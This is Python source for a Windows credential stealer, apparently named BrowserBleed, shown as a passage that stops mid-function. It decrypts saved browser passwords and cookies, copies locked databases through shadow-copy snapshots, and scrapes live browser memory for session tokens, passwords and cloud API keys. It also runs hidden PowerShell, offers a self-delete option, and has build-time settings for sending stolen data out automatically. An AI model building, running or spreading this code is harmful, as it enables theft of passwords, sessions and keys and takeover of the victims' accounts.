"""
BrowserBleed - Browser Credential & Memory Extractor
Authorized Red Team / Research Use Only

Default: tries everything - disk extraction + live memory scrape on all browsers.
Run as Administrator for full coverage (SQLite VSS fallback + elevated process access).

Usage:
  BrowserBleed.exe                          # all browsers, disk + memory
  BrowserBleed.exe --browser chrome         # target one browser
  BrowserBleed.exe --disk-only              # skip memory scraping
  BrowserBleed.exe --memory-only            # skip disk extraction
  BrowserBleed.exe --out results.txt        # custom output path
  BrowserBleed.exe --max-hits 500           # raise memory hit cap
  BrowserBleed.exe --self-delete            # delete exe after run (opsec)
  BrowserBleed.exe --verify                 # verify tokens against their services (outbound)
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import ctypes
import ctypes.wintypes as wintypes
import tempfile
import time
import re
import subprocess
import argparse
import socket
import struct
import http.client
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from ctypes import windll, byref

if sys.stdout is not None:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# Set True in main() when --verify is passed; gates OIDC discovery network calls
_do_oidc: bool = False

# ── Windows API constants ──────────────────────────────────────────────────────
PROCESS_VM_READ           = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT                = 0x1000
MEM_IMAGE                 = 0x1000000  # DLL/EXE code sections - skip, no credentials here
PAGE_NOACCESS             = 0x01
PAGE_GUARD                = 0x100
TH32CS_SNAPPROCESS        = 0x00000002

_GENERIC_READ          = 0x80000000
_FILE_SHARE_READ       = 0x00000001
_FILE_SHARE_WRITE      = 0x00000002
_FILE_SHARE_DELETE     = 0x00000004
_OPEN_EXISTING         = 3
_FILE_ATTRIBUTE_NORMAL = 0x80

_k32 = ctypes.windll.kernel32
_k32.CreateFileW.restype = ctypes.c_void_p
_k32.ReadFile.restype    = wintypes.BOOL
_k32.CloseHandle.restype = wintypes.BOOL


# ── Structures ─────────────────────────────────────────────────────────────────
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ProcessID",       wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID",        wintypes.DWORD),
        ("cntThreads",          wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase",      ctypes.c_long),
        ("dwFlags",             wintypes.DWORD),
        ("szExeFile",           ctypes.c_char * 260),
    ]


class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress",       ctypes.c_void_p),
        ("AllocationBase",    ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize",        ctypes.c_size_t),
        ("State",             wintypes.DWORD),
        ("Protect",           wintypes.DWORD),
        ("Type",              wintypes.DWORD),
    ]


# ── Process utilities ──────────────────────────────────────────────────────────
def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _is_system() -> bool:
    """Return True if running as SYSTEM (token user SID == S-1-5-18)."""
    try:
        import ctypes.wintypes as wt
        TOKEN_QUERY      = 0x0008
        TokenUser        = 1
        hToken = wt.HANDLE()
        if not ctypes.windll.advapi32.OpenProcessToken(
            ctypes.windll.kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(hToken)
        ):
            return False
        buf  = ctypes.create_string_buffer(256)
        size = wt.DWORD(0)
        ctypes.windll.advapi32.GetTokenInformation(hToken, TokenUser, buf, 256, ctypes.byref(size))
        ctypes.windll.kernel32.CloseHandle(hToken)
        system_sid = b"\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00"
        return buf.raw[8:20] == system_sid
    except Exception:
        return False


def find_pids(name: str) -> list[int]:
    snapshot = windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == wintypes.HANDLE(-1).value:
        return []
    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
    results = []
    if windll.kernel32.Process32First(snapshot, byref(entry)):
        while True:
            if name.lower() == entry.szExeFile.decode(errors="replace").lower():
                results.append(entry.th32ProcessID)
            if not windll.kernel32.Process32Next(snapshot, byref(entry)):
                break
    windll.kernel32.CloseHandle(snapshot)
    return results


_NO_WINDOW = subprocess.CREATE_NO_WINDOW


def is_process_running(name: str) -> bool:
    return bool(find_pids(name))


def _pid_site_map(process_name: str) -> dict[int, str]:
    """Map each renderer PID → site URL via --site-instance-site in the process command line.
    Uses a single WMI query across all PIDs instead of one PowerShell per PID."""
    sites: dict[int, str] = {}
    pids = find_pids(process_name)
    if not pids:
        return sites
    try:
        pids_csv = ",".join(str(p) for p in pids)
        ps = (
            f"$p=@({pids_csv});"
            "Get-WmiObject Win32_Process|Where-Object{$p -contains $_.ProcessId}|"
            "ForEach-Object{$_.ProcessId.ToString()+'|'+$_.CommandLine}"
        )
        r = subprocess.run(
            ["powershell", "-NonInteractive", "-NoProfile", "-Command", ps],
            capture_output=True, text=True, timeout=15,
            creationflags=_NO_WINDOW,
        )
        for line in r.stdout.strip().splitlines():
            parts = line.split("|", 1)
            if len(parts) == 2:
                try:
                    pid = int(parts[0])
                except ValueError:
                    continue
                m_site = re.search(r"--site-instance-site=(https?://[^\s,\"]+)", parts[1])
                if m_site:
                    sites[pid] = m_site.group(1)
    except Exception:
        pass
    return sites


# ── File copy utilities ────────────────────────────────────────────────────────
_SHADOW_ID_RE = re.compile(r"^\{[0-9A-Fa-f\-]{36}\}$")


def vss_copy(src: str) -> str | None:
    """Read a locked file via VSS snapshot. Requires admin. Returns temp path or None."""
    if not is_admin():
        return None
    try:
        src   = os.path.normpath(src)
        drive = os.path.splitdrive(src)[0] + "\\"

        subprocess.run(
            ["powershell", "-NonInteractive", "-NoProfile", "-Command",
             "Start-Service vds,VSS -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2"],
            capture_output=True, timeout=20, creationflags=_NO_WINDOW
        )

        # Check for an existing snapshot on this volume before creating a new one
        ps_find = (
            f"$sc=Get-WmiObject Win32_ShadowCopy|Where-Object{{$_.VolumeName -eq '{drive}'}}|"
            "Select-Object -First 1;"
            "if($sc){Write-Output ($sc.DeviceName + '|' + $sc.ID + '|existing')}else{Write-Output 'none'}"
        )
        r0 = subprocess.run(
            ["powershell", "-NonInteractive", "-NoProfile", "-Command", ps_find],
            capture_output=True, text=True, timeout=15, creationflags=_NO_WINDOW,
        )
        existing_out = r0.stdout.strip()

        if existing_out and existing_out != "none" and "|" in existing_out:
            parts = existing_out.split("|")
            device    = parts[0].strip()
            shadow_id = parts[1].strip()
            reuse     = True
        else:
            reuse = False
            ps_create = (
                "$c=[wmiclass]'root\\cimv2:Win32_ShadowCopy';"
                f"$r=$c.Create('{drive}','ClientAccessible');"
                "if($r.ReturnValue -eq 0){"
                "$sc=Get-WmiObject Win32_ShadowCopy|Where-Object{$_.ID -eq $r.ShadowID};"
                "Write-Output ($sc.DeviceName + '|' + $r.ShadowID)"
                "}else{exit 1}"
            )
            r1 = subprocess.run(
                ["powershell", "-NonInteractive", "-NoProfile", "-Command", ps_create],
                capture_output=True, text=True, timeout=40, creationflags=_NO_WINDOW
            )
            output = r1.stdout.strip()
            if not output or "|" not in output:
                return None
            device, shadow_id = output.rsplit("|", 1)
            device    = device.strip()
            shadow_id = shadow_id.strip()

        # Sanitize shadow_id - must be a GUID
        if not _SHADOW_ID_RE.match(shadow_id):
            return None

        rel     = os.path.splitdrive(src)[1]
        vss_src = device + rel

        tmp = tempfile.NamedTemporaryFile(suffix=".tmp", delete=False)
        tmp.close()
        shutil.copy2(vss_src, tmp.name)

        if not reuse:
            subprocess.run(
                ["powershell", "-NonInteractive", "-NoProfile", "-Command",
                 f"(Get-WmiObject Win32_ShadowCopy|Where-Object{{$_.ID -eq '{shadow_id}'}}).Delete()"],
                capture_output=True, timeout=10, creationflags=_NO_WINDOW
            )
        return tmp.name
    except Exception:
        return None


def copy_to_temp(src: str) -> str:
    tmp = tempfile.NamedTemporaryFile(suffix=".tmp", delete=False)
    tmp.close()
    handle = _k32.CreateFileW(
        src, _GENERIC_READ,
        _FILE_SHARE_READ | _FILE_SHARE_WRITE | _FILE_SHARE_DELETE,
        None, _OPEN_EXISTING, _FILE_ATTRIBUTE_NORMAL, None
    )
    if handle is None or handle in (-1, 0xFFFFFFFFFFFFFFFF):
        raise OSError(f"CreateFileW failed (error {_k32.GetLastError()}): {src}")
    buf = ctypes.create_string_buffer(1024 * 1024)
    bytes_read = wintypes.DWORD(0)
    try:
        with open(tmp.name, "wb") as out:
            while True:
                ok = _k32.ReadFile(handle, buf, len(buf), ctypes.byref(bytes_read), None)
                if not ok or bytes_read.value == 0:
                    break
                out.write(buf.raw[: bytes_read.value])
    finally:
        _k32.CloseHandle(handle)
    if os.path.getsize(tmp.name) == 0:
        shutil.copy2(src, tmp.name)
    return tmp.name


def sqlite_connect(path: str) -> sqlite3.Connection:
    return sqlite3.connect(path, timeout=2.0)


def sqlite_execute(conn: sqlite3.Connection, query: str, retries: int = 8, delay: float = 0.25):
    """Execute a query with retry on SQLITE_BUSY. Returns cursor rows as a list."""
    last_err = None
    for _ in range(retries):
        try:
            return list(conn.execute(query))
        except sqlite3.OperationalError as e:
            if "locked" in str(e).lower():
                last_err = e
                time.sleep(delay)
            else:
                raise
    raise last_err


def copy_db_with_wal(src: str) -> str:
    """Copy a SQLite DB and its -wal/-shm companions to a temp dir.
    Tries shared-read copy first; falls back to VSS if the file is exclusively locked.
    Returns the path to the copied DB file; caller must rmtree the parent dir.
    """
    tmp_dir = tempfile.mkdtemp()
    db_name = os.path.basename(src)
    tmp_db  = os.path.join(tmp_dir, db_name)

    main_copy = None
    try:
        main_copy = copy_to_temp(src)
    except OSError:
        pass

    if main_copy:
        shutil.move(main_copy, tmp_db)
    else:
        vss_tmp = vss_copy(src)
        if vss_tmp:
            shutil.move(vss_tmp, tmp_db)
        else:
            shutil.rmtree(tmp_dir, ignore_errors=True)
            if is_admin():
                hint = " - file is exclusively locked by browser; VSS may not be available on this system"
            else:
                hint = " - run as Administrator to enable VSS fallback"
            raise OSError(f"Could not copy locked file{hint}: {src}")

    for suffix in ("-wal", "-shm"):
        companion = src + suffix
        if os.path.exists(companion):
            try:
                shutil.copy2(companion, tmp_db + suffix)
            except Exception:
                pass

    return tmp_db


# ── Memory scraping ────────────────────────────────────────────────────────────
CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
    "JWT token":           re.compile(rb"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"),
    "Bearer token":        re.compile(rb"(?i)Bearer\s+[A-Za-z0-9\-._~+/]{20,}"),
    "Authorization header":re.compile(rb"Authorization:\s*[A-Za-z]+\s+[A-Za-z0-9\-._~+/=]{20,}"),
    "Cookie header":       re.compile(rb"Cookie:\s*[\x20-\x7e]{40,512}"),
    "Set-Cookie header":   re.compile(rb"Set-Cookie:\s*[\x20-\x7e]{20,512}"),
    "OAuth access_token":  re.compile(rb"(?i)access_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})(?=[\"'\s\x00&,;:\r\n]|$)"),
    "OAuth refresh_token": re.compile(rb"(?i)refresh_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})(?=[\"'\s\x00&,;:\r\n]|$)"),
    "Session token":       re.compile(rb"(?i)session[_-]?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=%]{20,256})"),
    "Session ID":          re.compile(rb"(?i)session[_-]?id[\"'\s]*[=:][\"'\s]*([A-Fa-f0-9\-]{16,128})"),
    "Password (POST body)":re.compile(rb"(?im)(?:^|&|\?)password=([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})(?:&|$|\s|\x00)"),
    "Password (JSON/API)": re.compile(rb'(?i)"password"\s*:\s*"([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})"'),
    "Google SAPISID":      re.compile(rb"SAPISID=[A-Za-z0-9_/\-]{20,}"),
    "Slack token":         re.compile(rb"xox[baprs]-[A-Za-z0-9\-]{10,}"),
    "GitHub token":        re.compile(rb"gh[pousr]_[A-Za-z0-9]{36,}"),
    "Discord token":       re.compile(rb"[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"),
    "AWS Access Key":      re.compile(rb"A(?:KIA|SIA|ROA|IDA)[A-Z0-9]{16}"),
    "Stripe key":          re.compile(rb"sk_(?:live|test)_[A-Za-z0-9]{24,}"),
    "npm token":           re.compile(rb"npm_[A-Za-z0-9]{36}"),
    "HuggingFace token":   re.compile(rb"hf_[A-Za-z0-9]{34,}"),
    "Vault token":         re.compile(rb"hvs\.[A-Za-z0-9]{90,}"),
    "Anthropic API key":   re.compile(rb"sk-ant-[A-Za-z0-9\-_]{90,}"),
    "SSH private key":     re.compile(rb"(-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----[^-]{100,4096}-----END (?:[A-Z ]+ )?PRIVATE KEY-----)"),
}

# Patterns whose raw bytes indicate a false positive (format strings, type schemas)
_NOISE_BYTES = re.compile(
    rb'%[a-z]'                       # C format string: %s %d %f
    rb'|\{[a-zA-Z_][a-zA-Z0-9_]*\}' # template placeholder: {token} {pageSize}
    rb'|"type":"string"'             # JSON schema fragment
    rb'|:\s*boolean[,\s]'            # TypeScript type annotation
    rb'|JwkSymKey'                   # 1Password type annotation
    rb'|LoggableString'              # type annotation
    rb'|\(function\s*\('             # minified JS source (not a real credential)
    rb'|\|\|\(\w+=\{\}\)\)'          # minified JS enum pattern
    rb'|[a-z]\.[a-zA-Z]+\.[a-zA-Z]+[Tt]oken'  # JS property chain: x.y.zToken
)

# Exact known-noise values (decoded strings)
_NOISE_EXACT: frozenset[str] = frozenset([
    "Password=true",
    "password://settings/developers",
])

# Hit display tiers:
#   0 = high-value (direct credential, show all)
#   1 = session/bearer (show all)
#   2 = noise-heavy (collapse to count summary)
_HIT_TIER: dict[str, int] = {
    "AWS Access Key": 0, "Anthropic API key": 0, "Anthropic API Key": 0,
    "SSH private key": 0, "SSH Private Key": 0,
    "Stripe key": 0, "Stripe Secret Key": 0,
    "Vault token": 0, "Vault Token": 0,
    "GitHub token": 0, "Slack token": 0, "Discord token": 0,
    "npm token": 0, "npm Token": 0,
    "HuggingFace token": 0, "HuggingFace Token": 0,
    "Password (POST body)": 1, "Password (JSON/API)": 1,
    "JWT token": 1, "Bearer token": 1, "Authorization header": 1,
    "Google SAPISID": 1,
    "OAuth access_token": 1, "OAuth refresh_token": 1,
    "Session token": 1,
    "Session ID": 2, "Cookie header": 2, "Set-Cookie header": 2,
}


def _trunc(val: str, n: int = 80) -> str:
    return val[:n] + "…" if len(val) > n else val


# Fast pre-filter: C-speed bytes.__contains__ checks before running any regex.
# A chunk that contains none of these prefixes can't contain a credential match.
# Build-time exfil defaults - substituted by build_windows.ps1 / build_mac.sh.
# When non-empty the exe auto-exfils after every run with no CLI flags required.
_EXFIL_URL: str = ""
_EXFIL_KEY: str = ""

_QUICK_PREFIXES: tuple[bytes, ...] = (
    b"eyJ",            # JWT
    b"Bearer ",        # Bearer / Authorization headers
    b"Authorization:", b"Cookie:", b"Set-Cookie:",
    b"access_token", b"refresh_token", b"session_token", b"session_id",
    b"password",
    b"SAPISID=",
    b"xox",            # Slack
    b"ghp_", b"gho_", b"ghu_", b"ghs_", b"ghr_",  # GitHub
    b"sk_live_", b"sk_test_",  # Stripe
    b"npm_",
    b"hf_",            # HuggingFace
    b"hvs.",           # Vault
    b"sk-ant-",        # Anthropic
    b"AKIA", b"ASIA", b"AROA", b"AIDA",  # AWS
    b"-----BEGIN",     # SSH / PEM keys
)


def _has_credential_hint(data: bytes) -> bool:
    return any(p in data for p in _QUICK_PREFIXES)


def _is_noise(raw: bytes, decoded: str) -> bool:
    """Return True if this match is a known false positive."""
    if decoded.strip() in _NOISE_EXACT:
        return True
    if _NOISE_BYTES.search(raw):
        return True
    return False


def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
    handle = windll.kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid
    )
    if not handle:
        err = _k32.GetLastError()
        if err == 87:   # ERROR_INVALID_PARAMETER - GPU/crashpad/utility process, skip silently
            return []
        raise PermissionError(f"OpenProcess failed (error {err})")

    raw_hits: list[dict] = []
    mbi  = MEMORY_BASIC_INFORMATION()
    addr = 0

    try:
        while len(raw_hits) < max_hits:
            if not windll.kernel32.VirtualQueryEx(
                handle, ctypes.c_void_p(addr), byref(mbi), ctypes.sizeof(mbi)
            ):
                break

            region_size = mbi.RegionSize
            if region_size == 0:
                break

            if (mbi.State == MEM_COMMIT
                    and mbi.Type != MEM_IMAGE
                    and not (mbi.Protect & PAGE_NOACCESS)
                    and not (mbi.Protect & PAGE_GUARD)):
                prev_data  = b""
                overlap_len = 512
                for offset in range(0, region_size, chunk):
                    read_size  = min(chunk, region_size - offset)
                    buf        = ctypes.create_string_buffer(read_size)
                    bytes_read = ctypes.c_size_t(0)
                    if not (windll.kernel32.ReadProcessMemory(
                        handle, ctypes.c_void_p(addr + offset),
                        buf, read_size, byref(bytes_read)
                    ) and bytes_read.value):
                        prev_data = b""
                        continue
                    data = buf.raw[: bytes_read.value]

                    # Skip zero-filled pages - no credentials live in zeroed memory
                    if not data.rstrip(b"\x00"):
                        prev_data = b""
                        continue

                    # Pre-filter: skip regex entirely if no known token prefix is present.
                    # bytes.__contains__ is C-speed; far cheaper than 20 regex passes.
                    if not _has_credential_hint(data) and not (prev_data and _has_credential_hint(prev_data[-overlap_len:])):
                        prev_data = data
                        continue

                    # Prepend tail of previous chunk to catch tokens split across boundary
                    overlap   = prev_data[-overlap_len:]
                    search_data = overlap + data

                    for label, pat in CREDENTIAL_PATTERNS.items():
                        for m in pat.finditer(search_data):
                            # Skip matches that end entirely within the overlap (already seen)
                            if m.end() <= len(overlap):
                                continue
                            raw_match    = m.group()
                            full_decoded = raw_match.decode(errors="replace")
                            if not _is_noise(raw_match, full_decoded):
                                value = m.group(m.lastindex).decode(errors="replace") if m.lastindex else full_decoded
                                dedup_key = f"{label}:{value[:80]}"
                                # Adjust match start address for the overlap prefix
                                match_addr = addr + offset + m.start() - len(overlap)
                                pre = prev_data[-2048:] if prev_data else b""
                                ctx = pre + data[:min(len(data), m.end() + 2048)]
                                raw_hits.append({
                                    "label":     label,
                                    "address":   hex(match_addr),
                                    "value":     value,
                                    "dedup_key": dedup_key,
                                    "pid":       pid,
                                    "context":   ctx,
                                })
                    prev_data = data
                    if len(raw_hits) >= max_hits:
                        break

            addr += region_size
    finally:
        windll.kernel32.CloseHandle(handle)

    return raw_hits


def deduplicate(hits: list[dict]) -> list[dict]:
    """Two-pass dedup:
    Pass 1 - group by label:value[:50], keep shortest (removes trailing noise).
    Pass 2 - within each label, if A is a prefix of B, replace A with B (recovers
              chunk-boundary truncations where the same token was captured twice,
              once cut short and once in full).
    """
    groups: dict[str, list[dict]] = {}
    for h in hits:
        key = f"{h['label']}:{h['value'][:50]}"
        groups.setdefault(key, []).append(h)
    result = [min(g, key=lambda h: len(h["value"])) for g in groups.values()]

    by_label: dict[str, list[dict]] = {}
    for h in result:
        by_label.setdefault(h["label"], []).append(h)

    final: list[dict] = []
    for label, group in by_label.items():
        group.sort(key=lambda h: len(h["value"]))
        kept: list[dict] = []
        for h in group:
            v = h["value"]
            upgraded = False
            for i, k in enumerate(kept):
                if len(k["value"]) >= 20 and v.startswith(k["value"]):
                    kept[i] = h
                    upgraded = True
                    break
            if not upgraded:
                kept.append(h)
        final.extend(kept)

    final.sort(key=lambda h: int(h["address"], 16))
    return final


# ── Browser config ─────────────────────────────────────────────────────────────
BROWSERS = [
    ("Google Chrome",  "chrome.exe",   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google",        "Chrome",        "User Data")),
    ("Microsoft Edge", "msedge.exe",   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft",     "Edge",          "User Data")),
    ("Brave",          "brave.exe",    os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")),
    ("Vivaldi",        "vivaldi.exe",  os.path.join(os.environ.get("LOCALAPPDATA", ""), "Vivaldi",       "User Data")),
    ("Opera",          "opera.exe",    os.path.join(os.environ.get("APPDATA", ""),      "Opera Software","Opera Stable")),
    ("Opera GX",       "opera.exe",    os.path.join(os.environ.get("APPDATA", ""),      "Opera Software","Opera GX Stable")),
    ("Chromium",       "chromium.exe", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Chromium",      "User Data")),
]


def _get_profiles(user_data_path: str) -> list[tuple[str, str]]:
    """Return [(label, profile_path)] for Default + Profile 1-19 + Guest Profile."""
    profiles = []
    default = os.path.join(user_data_path, "Default")
    if os.path.isdir(default):
        profiles.append(("Default", default))
    for i in range(1, 20):
        p = os.path.join(user_data_path, f"Profile {i}")
        if os.path.isdir(p):
            profiles.append((f"Profile {i}", p))
    guest = os.path.join(user_data_path, "Guest Profile")
    if os.path.isdir(guest):
        profiles.append(("Guest Profile", guest))
    return profiles if profiles else [("Default", default)]


# ── Crypto ─────────────────────────────────────────────────────────────────────
def dpapi_decrypt(ciphertext: bytes) -> bytes:
    if _is_system():
        raise RuntimeError(
            "Running as SYSTEM - DPAPI cannot decrypt user keys without the user's master key. "
            "Run as the target user or use token impersonation."
        )
    blob_in  = DATA_BLOB(len(ciphertext), ctypes.cast(ctypes.c_char_p(ciphertext), ctypes.POINTER(ctypes.c_char)))
    blob_out = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        raise RuntimeError("CryptUnprotectData failed")
    plaintext = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return plaintext


def get_master_key(user_data_path: str) -> bytes:
    with open(os.path.join(user_data_path, "Local State"), "r", encoding="utf-8") as f:
        local_state = json.load(f)
    return dpapi_decrypt(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:])


def decrypt_value(master_key: bytes, enc: bytes) -> str:
    try:
        if enc[:3] == b"v20":
            return "<v20 app-bound encryption: requires elevation service - use memory scrape>"
        if enc[:3] == b"v10":
            return AESGCM(master_key).decrypt(enc[3:15], enc[15:], None).decode("utf-8", errors="replace")
        return dpapi_decrypt(enc).decode("utf-8", errors="replace") if enc else ""
    except Exception as e:
        return f"<decrypt error: {e}>"


def chrome_epoch_to_str(us: int) -> str:
    if not us:
        return "session"
    try:
        return (datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=us)).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(us)


# ── Disk extraction ────────────────────────────────────────────────────────────
def extract_credentials(profile_path: str, master_key: bytes) -> list[dict]:
    db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(db_path):
        return []
    tmp_dir = None
    try:
        tmp_db  = copy_db_with_wal(db_path)
        tmp_dir = os.path.dirname(tmp_db)
        conn    = sqlite_connect(tmp_db)
        results = [
            {"url": url, "username": user, "password": decrypt_value(master_key, enc) if enc else ""}
            for url, user, enc in sqlite_execute(conn,
                "SELECT origin_url, username_value, password_value FROM logins"
            )
        ]
        conn.close()
        return results
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)


def _query_cookies(conn: sqlite3.Connection, master_key: bytes) -> list[dict]:
    """Query cookies table, falling back gracefully when samesite column is absent."""
    try:
        rows = sqlite_execute(conn,
            "SELECT host_key, name, value, encrypted_value, path, "
            "expires_utc, is_secure, is_httponly, samesite FROM cookies"
        )
        results = []
        for host, name, value, enc, path, exp, secure, httponly, samesite in rows:
            samesite_str = {0: "None", 1: "Lax", 2: "Strict"}.get(samesite, str(samesite))
            results.append({
                "host": host, "name": name,
                "value": decrypt_value(master_key, enc) if enc else value,
                "path": path, "expires": chrome_epoch_to_str(exp),
                "secure": bool(secure), "httponly": bool(httponly),
                "samesite": samesite_str,
            })
        return results
    except sqlite3.OperationalError:
        # Older Chrome schema without samesite column
        rows = sqlite_execute(conn,
            "SELECT host_key, name, value, encrypted_value, path, "
            "expires_utc, is_secure, is_httponly FROM cookies"
        )
        results = []
        for host, name, value, enc, path, exp, secure, httponly in rows:
            results.append({
                "host": host, "name": name,
                "value": decrypt_value(master_key, enc) if enc else value,
                "path": path, "expires": chrome_epoch_to_str(exp),
                "secure": bool(secure), "httponly": bool(httponly),
                "samesite": "?",
            })
        return results


def extract_cookies(profile_path: str, master_key: bytes) -> list[dict]:
    for candidate in [os.path.join("Network", "Cookies"), "Cookies"]:
        db_path = os.path.normpath(os.path.join(profile_path, candidate))
        if os.path.exists(db_path):
            break
    else:
        return []

    # Attempt 1: immutable read
    try:
        uri  = "file:///" + os.path.normpath(db_path).replace("\\", "/") + "?mode=ro&immutable=1"
        conn = sqlite3.connect(uri, uri=True)
        results = _query_cookies(conn, master_key)
        conn.close()
        if results:
            return results
    except Exception:
        pass

    # Attempt 2: copy DB + WAL + SHM
    tmp_dir = None
    try:
        tmp_db  = copy_db_with_wal(db_path)
        tmp_dir = os.path.dirname(tmp_db)
        conn    = sqlite_connect(tmp_db)
        results = _query_cookies(conn, master_key)
        conn.close()
        return results
    except Exception as e:
        raise RuntimeError(f"Cookie extraction failed: {e}") from e
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)


# ── Firefox cookie extraction ──────────────────────────────────────────────────
def extract_firefox_cookies_win() -> list[dict]:
    """Extract unencrypted cookies from all Firefox profiles on Windows."""
    appdata = os.environ.get("APPDATA", "")
    profiles_dir = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(profiles_dir):
        return []
    results = []
    for profile_name in os.listdir(profiles_dir):
        db_path = os.path.join(profiles_dir, profile_name, "cookies.sqlite")
        if not os.path.exists(db_path):
            continue
        tmp_dir = None
        try:
            tmp_db  = copy_db_with_wal(db_path)
            tmp_dir = os.path.dirname(tmp_db)
            conn    = sqlite_connect(tmp_db)
            try:
                rows = sqlite_execute(conn,
                    "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies"
                )
                for host, name, value, path, expiry, secure, httponly, samesite in rows:
                    samesite_str = {0: "None", 1: "Lax", 2: "Strict"}.get(samesite, str(samesite))
                    results.append({
                        "profile": profile_name,
                        "host": host, "name": name, "value": value,
                        "path": path,
                        "expires": datetime.fromtimestamp(expiry, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC") if expiry else "session",
                        "secure": bool(secure), "httponly": bool(httponly),
                        "samesite": samesite_str,
                    })
            except Exception:
                pass
            conn.close()
        except Exception:
            pass
        finally:
            if tmp_dir:
                shutil.rmtree(tmp_dir, ignore_errors=True)
    return results


# ── CDP cookie extraction ──────────────────────────────────────────────────────
def unix_ts_to_str(ts: float) -> str:
    if ts <= 0:
        return "session"
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(ts)


def _cdp_find_port(process_name: str) -> int | None:
    try:
        ps = f"(Get-WmiObject Win32_Process -Filter \"Name='{process_name}'\").CommandLine"
        r = subprocess.run(
            ["powershell", "-NonInteractive", "-NoProfile", "-Command", ps],
            capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW,
        )
        for line in r.stdout.splitlines():
            m = re.search(r"--remote-debugging-port=(\d+)", line)
            if m:
                return int(m.group(1))
    except Exception:
        pass
    for port in (9222, 9229, 9223, 9224):
        try:
            conn = http.client.HTTPConnection("localhost", port, timeout=1)
            conn.request("GET", "/json/version")
            resp = conn.getresponse()
            if resp.status == 200:
                data = json.loads(resp.read().decode(errors="replace"))
                if "webSocketDebuggerUrl" in data or "Browser" in data:
                    return port
        except Exception:
            pass
    return None


def _ws_connect(host: str, port: int, path: str) -> socket.socket:
    s = socket.create_connection((host, port), timeout=8)
    s.settimeout(15)
    key = base64.b64encode(os.urandom(16)).decode()
    hs  = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
           f"Origin: http://localhost\r\n\r\n")
    s.sendall(hs.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise ConnectionError("WebSocket handshake incomplete")
        buf += chunk
    if b" 101 " not in buf.split(b"\r\n")[0]:
        raise ConnectionError(f"WebSocket upgrade failed: {buf[:200]!r}")
    return s


def _ws_send(s: socket.socket, msg: str) -> None:
    payload = msg.encode()
    mask    = os.urandom(4)
    masked  = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    n       = len(payload)
    if n < 126:
        header = bytes([0x81, 0x80 | n]) + mask
    elif n < 65536:
        header = bytes([0x81, 0xFE]) + struct.pack(">H", n) + mask
    else:
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", n) + mask
    s.sendall(header + masked)


def _ws_read_frame(s: socket.socket) -> tuple[bool, int, bytes]:
    def recv_exact(n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = s.recv(n - len(buf))
            if not chunk:
